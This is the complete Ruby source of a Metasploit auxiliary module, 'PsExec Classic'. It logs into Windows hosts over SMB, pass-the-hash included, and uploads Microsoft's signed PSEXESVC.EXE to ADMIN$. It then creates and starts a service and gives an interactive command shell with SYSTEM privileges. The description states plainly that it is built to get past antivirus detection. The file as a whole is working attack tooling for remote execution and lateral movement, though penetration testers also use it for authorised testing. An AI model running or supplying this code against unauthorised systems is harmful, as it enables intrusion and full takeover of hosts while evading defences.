##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/proto/smb/constants'
require 'rex/proto/smb/exceptions'
require 'msf/core/exploit/smb/psexec_svc'
require 'openssl'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB
  include Msf::Exploit::Remote::SMB::Authenticated
  include Msf::Exploit::Remote::SMB::PsexecSvc

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'PsExec Classic',
                      'Description'    => %q{
This module mimics the classic PsExec tool from Microsoft SysInternals.
 Anti-virus software has recently rendered the commonly-used
exploit/windows/smb/psexec module much less useful because the uploaded
executable stub is usually detected and deleted before it can be used.  This
module sends the same code to the target as the authentic PsExec (which
happens to have a digital signature from Microsoft), thus anti-virus software
cannot distinguish the difference.  AV cannot block it without also blocking
the authentic version.  Of course, this module also supports pass-the-hash,
which the authentic PsExec does not.  You must provide a local path to the
authentic PsExec.exe (via the PSEXEC_PATH option) so that the PSEXESVC.EXE
service code can be extracted and uploaded to the target.  The specified
command (via the COMMAND option) will be executed with SYSTEM privileges.
                        },
                      'Author'         =>
                      [
                       'Joe Testa <jtesta[at]positronsecurity.com>'
                      ],
                      'License'        => MSF_LICENSE,
                      'References'     =>
                      [
                       [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
                      ],
                      'Platform'       => 'win',
    ))

    register_options([
                      OptString.new('PSEXEC_PATH', [ true, "The local path to the authentic PsExec.exe", '' ]),
                      OptString.new('COMMAND', [ true, "The program to execute with SYSTEM privileges.", 'cmd.exe' ])
                     ], self.class )
  end

  def run
    psexec_path = datastore['PSEXEC_PATH']
    command = datastore['COMMAND']

    psexesvc,psexec_version = extract_psexesvc(psexec_path, true)

    print_status("Connecting to #{datastore['RHOST']}...")
    unless connect
      fail_with(Failure::Unreachable, 'Failed to connect.')
    end

    print_status("Authenticating to #{smbhost} as user '#{splitname(datastore['SMBUser'])}'...")
    smb_login

    if (not simple.client.auth_user)
      fail_with(Failure::NoAccess, 'Server granted only Guest privileges.')
    end

    print_status('Uploading PSEXESVC.EXE...')
    simple.connect("\\\\#{datastore['RHOST']}\\ADMIN\$")

    # Attempt to upload PSEXESVC.EXE into the ADMIN$ share.  If this
    # fails, attempt to continue since it might already exist from
    # a previous run.
    begin
      fd = smb_open('\\PSEXESVC.EXE', 'rwct')
      fd << psexesvc
      fd.close
      print_status('Created \PSEXESVC.EXE in ADMIN$ share.')
    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
      # 0xC0000043 = STATUS_SHARING_VIOLATION, which in this
      # case means that the file was already there from a
      # previous invocation...
      if e.error_code == 0xC0000043
        print_error('Failed to upload PSEXESVC.EXE into ADMIN$ share because it already exists.  Attempting to continue...')
      else
        print_error('Error ' + e.get_error(e.error_code) + ' while uploading PSEXESVC.EXE into ADMIN$ share.  Attempting to continue...')
      end
    end
    psexesvc = nil

    simple.disconnect("\\\\#{datastore['RHOST']}\\ADMIN\$")

    print_status('Connecting to IPC$...')
    simple.connect("\\\\#{datastore['RHOST']}\\IPC\$")
    handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
    print_status("Binding to DCERPC handle #{handle}...")
    dcerpc_bind(handle)
    print_status("Successfully bound to #{handle} ...")


    begin
      # Get a handle to the service control manager.
      print_status('Obtaining a service control manager handle...')
      scm_handle = dce_openscmanagerw(dcerpc, datastore['RHOST'])
      if scm_handle == nil
        fail_with(Failure::Unknown, 'Failed to obtain handle to service control manager.')
      end

      # Create the service.
      print_status('Creating a new service (PSEXECSVC - "PsExec")...')
      begin
        svc_handle = dce_createservicew(dcerpc,
                                        scm_handle,
                                        'PSEXESVC',  # Service name
                                        'PsExec',    # Display name
                                        '%SystemRoot%\PSEXESVC.EXE', # Binary path
                                        {:type => 0x00000010}) # Type: Own process
        if svc_handle == nil
          fail_with(Failure::Unknown, 'Error while creating new service.')
        end

        # Close the handle to the service.
        unless dce_closehandle(dcerpc, svc_handle)
          print_error('Failed to close service handle.')
          # If this fails, we can still continue...
        end

      rescue Rex::Proto::DCERPC::Exceptions::Fault => e
        # An exception can occur if the service already exists due to a prior unclean shutdown.  We can try to
        # continue anyway.
      end

      # Re-open the service.  In case we failed to create the service because it already exists from a previous invokation,
      # this will obtain a handle to it regardless.
      print_status('Opening service...')
      svc_handle = dce_openservicew(dcerpc, scm_handle, 'PSEXESVC')
      if svc_handle == nil
        fail_with(Failure::Unknown, 'Failed to open service.')
      end

      # Start the service.
      print_status('Starting the service...')
      unless dce_startservice(dcerpc, svc_handle)
        fail_with(Failure::Unknown, 'Failed to start the service.')
      end

    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      fail_with(Failure::Unknown, "#{e}\n#{e.backtrace.join("\n")}")
    end

    # The pipe to connect to varies based on the version.
    psexesvc_pipe_name = nil
    if psexec_version == 1.98
      psexesvc_pipe_name = 'psexecsvc'
    elsif psexec_version >= 2.0
      psexesvc_pipe_name = 'PSEXESVC'
    else
      fail_with(Failure::Unknown, "Internal error.  A PsExec version of #{psexec_version} is not valid!")
    end

    # Open a pipe to the right service.
    print_status("Connecting to \\#{psexesvc_pipe_name} pipe...")
    psexecsvc_proc = simple.create_pipe("\\#{psexesvc_pipe_name}")
    smbclient = simple.client

    cipherEncrypt = nil
    cipherDecrypt = nil
    encryptedStream = false
    aes_key = nil
    # Newer versions of PsExec need to set up (unauthenticated) encryption.
    if psexec_version == 2.1 or psexec_version == 2.11
      encryptedStream = true

      magic = simple.trans_pipe(psexecsvc_proc.file_id, NDR.long(0xC8) + NDR.long(0x0A280105) + NDR.long(0x01))

      # v2.1 and later introduced encryption to the protocol.  Amusingly, there
      # is no authentication done on the key exchange, so its only useful
      # against passive eavesdroppers.

      # Read 4 bytes, which correspond to the length of the PUBLICKEYBLOB
      # that will be returned next (we assume it will always be 148, otherwise
      # the code would require restructuring in ways that are unknown at this
      # time).
      smbclient.read(psexecsvc_proc.file_id, 0, 4)

      # This is the PUBLICKEYSTRUC containing the header information and
      # 1,024-bit RSA key.
      blob = smbclient.read(psexecsvc_proc.file_id, 0, 148)['Payload'].v['Payload']

      rsa_public_key = load_rsa_public_key(blob)
      if rsa_public_key == nil
        print_error "Error while loading RSA key."
        # TODO: do some sort of cleanup.
        return
      end

      # Create Cipher objects for encryption and decryption.  Generate a
      # random 256-bit session key.
      cipherEncrypt = OpenSSL::Cipher::AES.new(256, :CBC)
      cipherEncrypt.encrypt
      aes_key = cipherEncrypt.random_key
      cipherEncrypt.iv = "\x00" * 16

      cipherDecrypt = OpenSSL::Cipher::AES.new(256, :CBC)
      cipherDecrypt.decrypt
      cipherDecrypt.key = aes_key
      cipherDecrypt.iv = "\x00" * 16

      # Encrypt the symmetric key with the RSA key.
      encrypted_key = rsa_encrypt(rsa_public_key, aes_key)

      # Tell the server that we will be sending 140 bytes in the next message.
      smbclient.write(psexecsvc_proc.file_id, 0, "\x8c\x00\x00\x00")

      # This is the PUBLICKEYSTRUC header that preceeds the encrypted key.
      publickeystruc = "\x01" +     # bType = SIMPLEBLOB
                       "\x02" +     # bVersion
                       "\x00\x00" + # reserved
                       "\x10\x66\x00\x00" + # ALG_ID = 0x6610 =
                                            # ALG_CLASS_DATA_ENCRYPT|
                                            # ALG_TYPE_BLOCK|ALG_SID_AES_256
                       "\x00\xa4\x00\x00" # ALG_ID = 0xa400 =
                                          # ALG_CLASS_KEY_EXCHANGE|
                                          # ALG_TYPE_RSA|ALG_SIG_ANY

      # Write the RSA-encrypted AES key.
      smbclient.write(psexecsvc_proc.file_id, 0, publickeystruc + encrypted_key)

    else  # Older versions only need a simple ping to wake up.
      magic = simple.trans_pipe(psexecsvc_proc.file_id, NDR.long(0xBE))
    end

    # Make up a random hostname and local PID to send to the
    # service.  It will create named pipes for stdin/out/err based
    # on these.
    random_hostname = Rex::Text.rand_text_alpha(12)
    random_client_pid_low = rand(255)
    random_client_pid_high = rand(255)
    random_client_pid = (random_client_pid_low + (random_client_pid_high * 256)).to_s

    print_status("Instructing service to execute #{command}...")


    # In the first message, we tell the service our made-up
    # hostname and PID, and tell it what program to execute.
    data1 = aes("\x58\x4a\x00\x00" << random_client_pid_low.chr <<
      random_client_pid_high.chr << "\x00\x00" <<
      Rex::Text.to_unicode(random_hostname) <<
      ("\x00" * 496) << Rex::Text.to_unicode(command) <<
      ("\x00" * (3762 - (command.length * 2))), cipherEncrypt)

    # In the next three messages, we just send lots of zero bytes...
    data2 = aes("\x00" * 4290, cipherEncrypt)
    data3 = aes("\x00" * 4290, cipherEncrypt)
    data4 = aes("\x00" * 4290, cipherEncrypt)

    # In the final message, we give it some magic bytes.  This
    # (somehow) corresponds to the "-s" flag in PsExec.exe, which
    # tells it to execute the specified command as SYSTEM.
    data5 = aes(("\x00" * 793) << "\x01" <<
        ("\x00" * 14) << "\xff\xff\xff\xff" <<
        ("\x00" * 1048) << "\x01" << ("\x00" * 11), cipherEncrypt)

    # If the stream is encrypted, we must first send the length of the
    # entire ciphertext.
    data_len_packed = "\x58\x4a"
    remaining = 19032
    if encryptedStream then
      ciphertext_length = data1.length + data2.length + data3.length + data4.length + data5.length
      remaining = ciphertext_length

      data_len_packed = [ciphertext_length].pack('v')
      smbclient.write(psexecsvc_proc.file_id, 0, [remaining].pack('V'))
    end


    # The standard client.write() method doesn't work since the
    # service is expecting certain packet flags to be set.  Hence,
    # we need to use client.write_raw() and specify everything
    # ourselves (such as Unicode strings, AndXOffsets, and data
    # offsets).

    offset = 0
    smbclient.write_raw({:file_id => psexecsvc_proc.file_id,
                         :flags1 => 0x18,
                         :flags2 => 0xc807,
                         :wordcount => 14,
                         :andx_command => 255,
                         :andx_offset => 57054,
                         :offset => offset,
                         :write_mode => 0x000c,
                         :remaining => remaining,
                         :data_len_high => 0,
                         :data_len_low => data1.length + 2,
                         :data_offset => 64,
                         :high_offset => 0,
                         :byte_count => data1.length + 3,
                         :data => "\xee" << data_len_packed << data1,
                         :do_recv => true})
    offset += data1.length

    smbclient.write_raw({:file_id => psexecsvc_proc.file_id,
                         :flags1 => 0x18,
                         :flags2 => 0xc807,
                         :wordcount => 14,
                         :andx_command => 255,
                         :andx_offset => 57054,
                         :offset => offset,
                         :write_mode => 0x0004,
                         :remaining => remaining,
                         :data_len_high => 0,
                         :data_len_low => data2.length,
                         :data_offset => 64,
                         :high_offset => 0,
                         :byte_count => data2.length + 1,
                         :data => "\xee" << data2,
                         :do_recv => true})

    offset += data2.length

    smbclient.write_raw({:file_id => psexecsvc_proc.file_id,
                         :flags1 => 0x18,
                         :flags2 => 0xc807,
                         :wordcount => 14,
                         :andx_command => 255,
                         :andx_offset => 57054,
                         :offset => offset,
                         :write_mode => 0x0004,
                         :remaining => remaining,
                         :data_len_high => 0,
                         :data_len_low => data3.length,
                         :data_offset => 64,
                         :high_offset => 0,
                         :byte_count => data3.length + 1,
                         :data => "\xee" << data3,
                         :do_recv => true})

    offset += data3.length

    smbclient.write_raw({:file_id => psexecsvc_proc.file_id,
                         :flags1 => 0x18,
                         :flags2 => 0xc807,
                         :wordcount => 14,
                         :andx_command => 255,
                         :andx_offset => 57054,
                         :offset => offset,
                         :write_mode => 0x0004,
                         :remaining => remaining,
                         :data_len_high => 0,
                         :data_len_low => data4.length,
                         :data_offset => 64,
                         :high_offset => 0,
                         :byte_count => data4.length + 1,
                         :data => "\xee" << data4,
                         :do_recv => true})

    offset += data4.length

    smbclient.write_raw({:file_id => psexecsvc_proc.file_id,
                         :flags1 => 0x18,
                         :flags2 => 0xc807,
                         :wordcount => 14,
                         :andx_command => 255,
                         :andx_offset => 57054,
                         :offset => offset,
                         :write_mode => 0x0004,
                         :remaining => remaining,
                         :data_len_high => 0,
                         :data_len_low => data5.length,
                         :data_offset => 64,
                         :high_offset => 0,
                         :byte_count => data5.length + 1,
                         :data => "\xee" << data5,
                         :do_recv => true})


    # Connect to the named pipes that correspond to stdin, stdout,
    # and stderr.
    psexecsvc_proc_stdin = connect_to_pipe("\\#{psexesvc_pipe_name}-#{random_hostname}-#{random_client_pid}-stdin")
    psexecsvc_proc_stdout = connect_to_pipe("\\#{psexesvc_pipe_name}-#{random_hostname}-#{random_client_pid}-stdout")
    psexecsvc_proc_stderr = connect_to_pipe("\\#{psexesvc_pipe_name}-#{random_hostname}-#{random_client_pid}-stderr")

    # Read 1024 bytes at a time if the stream is not encrypted.  Otherwise,
    # we need to read the length packet first (which is always a 4-byte
    # DWORD), followed by a second packet with the data.
    readLenStdout = readLenStderr = 1024
    if encryptedStream then
      readLenStdout = readLenStderr = 4

      # Each message is not chained to any previous one.
      cipherEncrypt.reset
    end

    # Read from stdout and stderr.  We need to record the multiplex
    # IDs so that when we get a response, we know which it belongs
    # to.  Trial & error showed that the service DOES NOT like it
    # when you repeatedly try to read from a pipe when it hasn't
    # returned from the last call.  Hence, we use these IDs to know
    # when to call read again.
    stdout_multiplex_id = smbclient.multiplex_id
    smbclient.read(psexecsvc_proc_stdout.file_id, 0, readLenStdout, false)

    stderr_multiplex_id = smbclient.multiplex_id
    smbclient.read(psexecsvc_proc_stderr.file_id, 0, readLenStderr, false)

    # Loop to read responses from the server and process commands
    # from the user.
    socket = smbclient.socket
    rds = [socket, $stdin]
    wds = []
    eds = []
    last_char = nil
    data = nil
    begin
      while true
        r,w,e = ::IO.select(rds, wds, eds, 1.0)

        # If we have data from the socket to read...
        if (r != nil) and (r.include? socket)

          # Read the SMB packet.
          data = smbclient.smb_recv
          smbpacket = Rex::Proto::SMB::Constants::SMB_BASE_PKT.make_struct
          smbpacket.from_s(data)

          # If this is a response to our read
          # command...
          if smbpacket['Payload']['SMB'].v['Command'] == Rex::Proto::SMB::Constants::SMB_COM_READ_ANDX
            parsed_smbpacket = smbclient.smb_parse_read(smbpacket, data)

            # Check to see if this is a STATUS_PIPE_DISCONNECTED
            # (0xc00000b0) message, which tells us that the remote program
            # has terminated.
            if parsed_smbpacket['Payload']['SMB'].v['ErrorClass'] == 0xc00000b0
              print_status "Received STATUS_PIPE_DISCONNECTED.  Terminating..."
              # Read in another SMB packet, since program termination
              # causes both the stdout and stderr pipes to issue a
              # disconnect message.
              smbclient.smb_recv rescue nil

              # Break out of the while loop so we can clean up.
              break
            end

            # Determine if this response came from stdout or stderr based on the multiplex ID.
            stdout_response = stderr_response = false
            received_multiplex_id = parsed_smbpacket['Payload']['SMB'].v['MultiplexID']
            if received_multiplex_id == stdout_multiplex_id
              stdout_response = true
            elsif received_multiplex_id == stderr_multiplex_id
              stderr_response = true
            end

            # Extract the length for what the server's next packet payload
            # will be (note that we need to cut off the single padding byte
            # prepended using [1..-1]).
            #
            # We fall into this block, too, if the payload length is 4, since
            # this happens when our previous read to stderr unexpectedly
            # returns with data.
            payload = parsed_smbpacket['Payload'].v['Payload'][1..-1]
            if encryptedStream
              # If we previously requested to read 4 bytes from a stream, parse the response, then we can issue
              # a second read request with the size of the data that's waiting for us.
              if stdout_response and (readLenStdout == 4)
                readLenStdout = payload.unpack('V')[0]
              elsif stderr_response && (readLenStderr == 4)
                readLenStderr = payload.unpack('V')[0]
              else
                # Decrypt the payload and print it.
                print aes(payload, cipherDecrypt)

                # Each block read from the server is encrypted separately from
                # all previous blocks.  Hence, the ciphertexts aren't chained
                # together.
                cipherDecrypt.reset

                # Issue a read command of length 4 to get the size of the next
                # ciphertext.
                stdout_response ? readLenStdout = 4 : readLenStderr = 4
              end
            # Older versions of PsExec don't encrypt anything...
            else
              print payload
            end

            # Issue another read request on whatever pipe just returned data.
            if stdout_response
              stdout_multiplex_id = smbclient.multiplex_id
              smbclient.read(psexecsvc_proc_stdout.file_id, 0, readLenStdout, false)
            elsif stderr_response
              stderr_multiplex_id = smbclient.multiplex_id
              smbclient.read(psexecsvc_proc_stderr.file_id, 0, readLenStderr, false)
            end
          end
        end

        # If the user entered some input.
        if r and r.include? $stdin

          # There's actually an entire line of text available, but the
          # standard PsExec.exe client sends one byte at a time, so we'll
          # duplicate this behavior.
          data = $stdin.read_nonblock(1)

          # The remote program expects CRLF line endings, but in Linux, we
          # only get LF line endings...
          if data == "\x0a" and last_char != "\x0d"

            # If the stream is encrypted, we need to send the length of the
            # encrypted message first, separately.
            cr = "\x0d"
            if encryptedStream then
              cr = aes(cr, cipherEncrypt)
              cipherEncrypt.reset
              smbclient.write(psexecsvc_proc_stdin.file_id, 0, [cr.length].pack('V'))
            end

            # Now we write the carriage return (either in plaintext or in
            # ciphertext).
            smbclient.write_raw({:file_id => psexecsvc_proc_stdin.file_id,
                                 :flags1 => 0x18,
                                 :flags2 => 0xc807,
                                 :wordcount => 14,
                                 :andx_command => 255,
                                 :andx_offset => 57054,
                                 :offset => 0,
                                 :write_mode => 0x0008,
                                 :remaining => cr.length,
                                 :data_len_high => 0,
                                 :data_len_low => cr.length,
                                 :data_offset => 64,
                                 :high_offset => 0,
                                 :byte_count => cr.length + 1,
                                 :data => "\xee" << cr,
                                 :do_recv => true})
          end  # end CRLF check

          # If the stream is encrypted, encrypt the data, then send a separate message
          # telling the server what the length of the next ciphertext is.
          original_data = data
          if encryptedStream then
            data = aes(data, cipherEncrypt)
            cipherEncrypt.reset
            smbclient.write(psexecsvc_proc_stdin.file_id, 0, [data.length].pack('V'))
          end

          smbclient.write_raw({:file_id => psexecsvc_proc_stdin.file_id,
                               :flags1 => 0x18,
                               :flags2 => 0xc807,
                               :wordcount => 14,
                               :andx_command => 255,
                               :andx_offset => 57054,
                               :offset => 0,
                               :write_mode => 0x0008,
                               :remaining => data.length,
                               :data_len_high => 0,
                               :data_len_low => data.length,
                               :data_offset => 64,
                               :high_offset => 0,
                               :byte_count => data.length + 1,
                               :data => "\xee" << data,
                               :do_recv => true})

          last_char = original_data
        end
      end
    rescue Rex::Proto::SMB::Exceptions::InvalidType => e
      print_error("Error: #{e}")
      print_status('Attempting to terminate gracefully...')
    end


    # Time to clean up.  Close the handles to stdin, stdout,
    # stderr, as well as the handle to the \psexecsvc pipe.
    smbclient.close(psexecsvc_proc_stdin.file_id) rescue nil
    smbclient.close(psexecsvc_proc_stdout.file_id) rescue nil
    smbclient.close(psexecsvc_proc_stderr.file_id) rescue nil
    smbclient.close(psexecsvc_proc.file_id) rescue nil

    # Stop the service.
    begin
      print_status('Stopping the service...')
      unless dce_stopservice(dcerpc, svc_handle)
        print_error('Error while stopping the service.')
        # We will try to continue anyway...
      end
    rescue Rex::Proto::SMB::Exceptions::InvalidType => e
      print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
    end

    # Wait a little bit for it to stop before we delete the service.
    begin
      if wait_for_service_to_stop(svc_handle) == false
        print_error('Could not stop the PSEXECSVC service.  Attempting to continue cleanup...')
      end
    rescue Rex::Proto::SMB::Exceptions::InvalidType => e
      print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
    end

    # Delete the service.
    begin
      print_status("Removing the service...")
      unless dce_deleteservice(dcerpc, svc_handle)
        print_error('Error while deleting the service.')
        # We will try to continue anyway...
      end

      print_status("Closing service handle...")
      unless dce_closehandle(dcerpc, svc_handle)
        print_error('Error while closing the service handle.')
        # We will try to continue anyway...
      end
    rescue Rex::Proto::SMB::Exceptions::InvalidType => e
      print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
    end


    # Disconnect from the IPC$ share.
    print_status("Disconnecting from \\\\#{datastore['RHOST']}\\IPC\$")
    simple.disconnect("\\\\#{datastore['RHOST']}\\IPC\$")

    # Connect to the ADMIN$ share so we can delete PSEXECSVC.EXE.
    print_status("Connecting to \\\\#{datastore['RHOST']}\\ADMIN\$")
    simple.connect("\\\\#{datastore['RHOST']}\\ADMIN\$")

    print_status('Deleting \\PSEXESVC.EXE...')
    simple.delete('\\PSEXESVC.EXE')

    # Disconnect from the ADMIN$ share.  Now we're done!
    print_status("Disconnecting from \\\\#{datastore['RHOST']}\\ADMIN\$")
    simple.disconnect("\\\\#{datastore['RHOST']}\\ADMIN\$")

  end

  # Connects to the specified named pipe.  If it cannot be done, up
  # to three retries are made.
  def connect_to_pipe(pipe_name)
    retries = 0
    pipe_fd = nil
    while (retries < 3) and (pipe_fd == nil)
      # On the first retry, wait one second, on the second
      # retry, wait two...
      select(nil, nil, nil, retries)

      begin
        pipe_fd = simple.create_pipe(pipe_name)
      rescue
        retries += 1
      end
    end

    if pipe_fd != nil
      print_status("Connected to named pipe #{pipe_name}.")
    else
      print_error("Failed to connect to #{pipe_name}!")
    end

    return pipe_fd
  end

  # Query the service and wait until its stopped.  Wait one second
  # before the first retry, two seconds before the second retry,
  # and three seconds before the last attempt.
  def wait_for_service_to_stop(svc_handle)
    service_stopped = false
    retries = 0
    while (retries < 3) and (service_stopped == false)
      Rex.sleep(retries)

      if dce_queryservice(dcerpc, svc_handle) == 2
        service_stopped = true
      else
        retries += 1
      end
    end
    return service_stopped
  end

  # Loads a PKCS#1 RSA public key from Microsoft's CryptExportKey function.
  # Returns a OpenSSL::PKey::RSA object on success, or nil on failure.
  def load_rsa_public_key(blob)

    blob = blob[1..-1]

    # PUBLICKEYSTRUC
    bType = blob[0, 1].ord
    bVersion = blob[1, 1].ord
    reserved = blob[2, 2]
    aiKeyAlg = blob[4, 4].unpack("L")[0]

    # RSAPUBKEY
    magic = blob[8, 4]
    bitlen = blob[12, 4].unpack("L")[0].to_i
    pubexpBE = blob[16, 4].unpack('N*').pack('V*')
    pubexpLE = blob[16, 4].unpack("L")[0]
    modulusLE = blob[20, blob.length - 20]
    modulusBE = modulusLE.reverse

    # This magic value is "RSA1".
    if magic != "\x52\x53\x41\x31" then
      print_error "Magic value is unexpected!: 0x" << magic.unpack("H*")[0]
      return nil
    end

    if bitlen != 1024 then
      print_error "RSA modulus is not 1024 as expected!: " << bitlen.to_s
      return nil
    end

    if pubexpLE.to_i != 65537 then
      print_error "Public exponent is not 65537 as expected!: " << pubexpLE.to_i.to_s
      return nil
    end

    return OpenSSL::PKey::RSA.new(make_DER_stream(modulusBE, pubexpBE))
  end

  # The Ruby OpenSSLs ASN.1 documentation is terrible, so I had to construct
  # the DER encoding for the key myself.  If anyone knows how to re-write this
  # with the ASN.1 support, please do!
  #
  # The ASN.1 encoder at http://lapo.it/asn1js/ was a big help here.
  def make_DER_stream(modulusBE, pubexpBE)

    modulusLen = modulusBE.length + 1 # + 1 for the extra \x00
    modulusLenByte = [modulusLen].pack('C')
    modulusInteger = "\x02\x81" << modulusLenByte << "\x00" << modulusBE

    pubexpLen = pubexpBE.length
    pubexpLenByte = [pubexpLen].pack('C')
    pubexpInteger = "\x02" << pubexpLenByte << pubexpBE

    modulusExpSequenceLen = modulusLen + 3 + pubexpLen + 2
    modulusExpSequenceLenByte = [modulusExpSequenceLen].pack('C')
    modulusExpSequence = "\x30\x81" << modulusExpSequenceLenByte << modulusInteger << pubexpInteger

    bitStringLen = modulusExpSequenceLen + 3 + 1 # + 1 for the extra \x00
    bitStringLenByte = [bitStringLen].pack('C')
    bitString = "\x03\x81" << bitStringLenByte << "\x00" << modulusExpSequence

    oid = "\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01"
    null = "\x05\x00"
    oidNullSequence = "\x30\x0d" << oid << null
    oidNullSequenceLen = oidNullSequence.length

    parentSequenceLen = oidNullSequenceLen + bitStringLen + 3
    parentSequenceLenByte = [parentSequenceLen].pack('C')
    parentSequence = "\x30\x81" << parentSequenceLenByte << oidNullSequence << bitString

    return parentSequence
  end

  # This is the I2OSP function, as defined in RSA PKCS#1 v2.1.  It takes a
  # number and encodes it into a byte string.
  def I2OSP(n, len)
    # Technically, we need to check that x isn't too large, but for this usage,
    # we're fine.

    n = n.to_i
    ret = ""

    # Loop through all 32-bit words.  Note that n.size will return 128 when n is
    # a 1024-bit number.
    for i in 0..((n.size / 4) - 1)
      # Grab the lower 32 bits only.
      word = n & 4294967295

      # Convert this word to a big-endian byte and add it to the result.
      ret = [word].pack("N") << ret

      # We're now done with processing the lower 32 bits.
      n = n >> 32
    end

    ret = ret.sub(/^\x00+/, '')
    return ("\x00" * (len - ret.size)) << ret
  end

  # This is the OS2IP function, as defined in RSA PKCS#1 v2.1.  It takes a
  # string and returns its number representation.
  def OS2IP(astring)
    ret = 0
    astring.each_byte do |b|
      ret = ret << 8
      ret = ret | b
    end
    ret
  end

  # Perform RSA PKCS#1 v1.5 encryption with a public key and a message.  The
  # result is in little-endian format for Microsoft's CryptImportKey to
  # understand.
  #
  # This implementation works for its intended purpose, but note that it is
  # missing length checks that are needed for security in other situations.
  # Also note that v1.5 of the spec is deprecated.
  def rsa_encrypt(key, message)
    ps_len = 128 - 3 - message.length
    ps = OpenSSL::Random.random_bytes(ps_len)

    # Yeah, that's right... a for loop.  U mad, bro?
    for i in 0..ps.length - 1
      # According to the spec, this random string must not have any zero bytes.
      if ps[ i ] == "\x00" then
        # For better entropy (and security), it would be better to re-generate
        # another random byte, but then we'd need more logic to ensure it too
        # wasn't zero.  All in favor of being lazy say "aye!"
        #
        # Aye!
        ps[ i ] = "\x69"
      end
    end

    eb = "\x00\x02" << ps << "\x00" << message
    m = OS2IP(eb)
    c = m.to_bn.mod_exp(key.e, key.n).to_bn
    em = I2OSP(c, 128)
    em.reverse
  end

  # Encrypts or decrypts a message with AES, if configured, or returns the
  # plaintext unmodified.
  def aes(message, cipher)
    if not cipher.nil? then
      return cipher.update(message) << cipher.final
    else
      return message
    end
  end

end
